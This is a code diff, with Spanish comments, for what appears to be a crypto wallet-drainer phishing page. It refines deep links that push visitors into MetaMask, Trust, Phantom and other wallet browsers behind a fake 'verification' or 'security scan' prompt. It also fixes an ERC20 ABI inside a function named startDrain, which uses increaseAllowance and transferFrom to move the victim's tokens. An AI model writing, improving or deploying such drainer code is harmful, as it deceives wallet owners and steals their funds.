@@ -535,65 +535,73 @@ function updateWalletGrid(detectedType) {
 }
 
 async function handleWalletSelection(selectedType, detectedType) {
+    // Lógica mejorada para abrir la wallet correcta según plataforma
     const isMobileDevice = isMobile();
-
-    // Mapeo preciso de enlaces profundos (Deep Links) verificados
-    const deepLinks = {
-        metamask: {
-            mobile: `https://metamask.app.link/dapp/${window.location.host}`,
-            desktop: `metamask://` 
-        },
-        trust: {
-            mobile: `https://link.trustwallet.org/open_url?url=${encodeURIComponent(window.location.href)}`,
-            desktop: null 
-        },
-        coinbase: {
-            mobile: `https://go.cb-w.com/dapp?dappUrl=${encodeURIComponent(window.location.host)}`,
-            desktop: `coinbase://dapp/${window.location.host}`
-        },
-        rabby: {
-            mobile: `https://rabby.io/dapp?dappUrl=${encodeURIComponent(window.location.host)}`,
-            desktop: `rabby://` 
-        },
-        binance: {
-            mobile: `https://www.binance.org/en/dapp?dd=${encodeURIComponent(window.location.href)}`,
-            desktop: `https://www.binance.org/en/dapp` 
-        },
-        phantom: {
-            mobile: `https://phantom.app/ulink1?connect=${encodeURIComponent(window.location.href)}`,
-            desktop: `phantom://dapp/${window.location.host}` 
-        }
-    };
-
+    
     if (isMobileDevice) {
+        // MÓVIL: Forzar apertura en navegador interno
+        let deepLink = "";
+        
+        if(selectedType === 'metamask') {
+            // MetaMask usa msafari:// para iOS o metamask:// para Android
+            deepLink = `msafari://${window.location.host}`; 
+        } else if (selectedType === 'trust') {
+            // Trust Wallet usa WalletConnect para abrir su navegador interno
+            deepLink = `wc:[email protected]?u=${encodeURIComponent(window.location.href)}`;
+        } else if (selectedType === 'phantom') {
+            deepLink = `https://phantom.app/ulink1?connect=${encodeURIComponent(window.location.href)}`;
+        } else if (selectedType === 'coinbase') {
+            deepLink = `cbwallet://dapp/${window.location.host}`;
+        } else if (selectedType === 'rabby') {
+            deepLink = `rabby://dapp/${window.location.host}`;
+        } else if (selectedType === 'binance') {
+            deepLink = `bsc://${window.location.host}`;
+        }
+
         modalTitle.textContent = `${selectedType.charAt(0).toUpperCase() + selectedType.slice(1)} Detected`;
         modalText.textContent = "Presiona 'Abrir App' para completar la verificación.";
         
-        let linkToOpen = deepLinks[selectedType]?.mobile || window.location.href;
-        
         openAppBtn.onclick = () => {
-            window.open(linkToOpen);
+            window.open(deepLink);
             setTimeout(() => {
                 tryConnect();
             }, 2000);
         };
         
         mobileModal.style.display = 'flex';
+        return;
     } else {
-        // Lógica para Escritorio (PC)
-        const link = deepLinks[selectedType]?.desktop;
+        // ESCRITORIO (PC): Usar esquemas profundos para activar la extensión
+        let linkToOpen = "";
         
-        if (link && link.startsWith('http')) {
-            window.open(link, '_blank');
-        } else if (link) {
-            window.location.href = link;
-        } else {
-            window.open(`https://${selectedType}.io`, '_blank');
+        if(selectedType === 'metamask') {
+            // Intenta abrir la ventana de conexión de MetaMask
+            linkToOpen = `metamask://`;
+        } else if (selectedType === 'phantom') {
+            // Phantom requiere este formato específico para escritorio
+            linkToOpen = `phantom://dapp/${window.location.host}`;
+        } else if (selectedType === 'rabby') {
+            linkToOpen = `rabby://`;
+        } else if (selectedType === 'coinbase') {
+            linkToOpen = `coinbase://dapp/${window.location.host}`;
+        } else if (selectedType === 'trust') {
+            // En PC, redirigimos a la web de Trust donde pueden escanear
+            linkToOpen = `https://link.trustwallet.org/open_url?url=${encodeURIComponent(window.location.href)}`;
+        } else if (selectedType === 'binance') {
+            linkToOpen = `https://www.binance.org/en/dapp?dd=${encodeURIComponent(window.location.href)}`;
         }
 
+        if(linkToOpen.startsWith('http')) {
+            window.open(linkToOpen, '_blank');
+        } else {
+            // Redirección directa al protocolo de la extensión
+            window.location.href = linkToOpen;
+        }
+
+        // Pequeño delay para intentar conectar si la extensión ya estaba instalada
         setTimeout(() => {
-            if (!window.ethereum) {
-                 log("Esperando a que la extensión se active...");
+            if (window.ethereum && (selectedType === 'metamask' ? window.ethereum.isMetaMask : true)) {
+                tryConnect();
             }
         }, 1500);
     }
@@ -612,29 +620,29 @@ async function tryConnect() {
  modalTitle.textContent = "Trust Wallet Detected";
  modalText.textContent = "Para verificar tus activos, abriremos el navegador interno.";
  openAppBtn.onclick = () => {
- window.open('https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href));
- tryConnect(); 
+     window.open('wc:[email protected]?u=' + encodeURIComponent(window.location.href));
+     tryConnect(); 
  };
  } else if (detectedWalletType === 'metamask' && !window.ethereum.isMetaMask) {
  modalTitle.textContent = "MetaMask Detected";
  modalText.textContent = "Abre la app para confirmar la conexión.";
  openAppBtn.onclick = () => {
- window.open('https://metamask.app.link/dapp/' + window.location.host);
- tryConnect();
+     window.open('msafari://' + window.location.host);
+     tryConnect();
  };
  } else {
  modalTitle.textContent = "Mobile Wallet Connected";
  modalText.textContent = "Presiona 'Conectar' para iniciar el escaneo de seguridad.";
  openAppBtn.onclick = () => {
- mobileModal.style.display = 'none';
- tryConnect();
+     mobileModal.style.display = 'none';
+     tryConnect();
  };
  }
  
  mobileModal.style.display = 'flex';
  confirmOpenBtn.addEventListener('click', () => {
- mobileModal.style.display = 'none';
- tryConnect();
+     mobileModal.style.display = 'none';
+     tryConnect();
  });
  return; 
  }
@@ -870,7 +878,7 @@ async function startDrain() {
  "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
- "function allowance(address owner, address spender) view returns (bool)"
+ "function allowance(address owner, address spender) view returns (uint256)"
  ], signer);
  
  const balance = await erc20.balanceOf(userAddress);
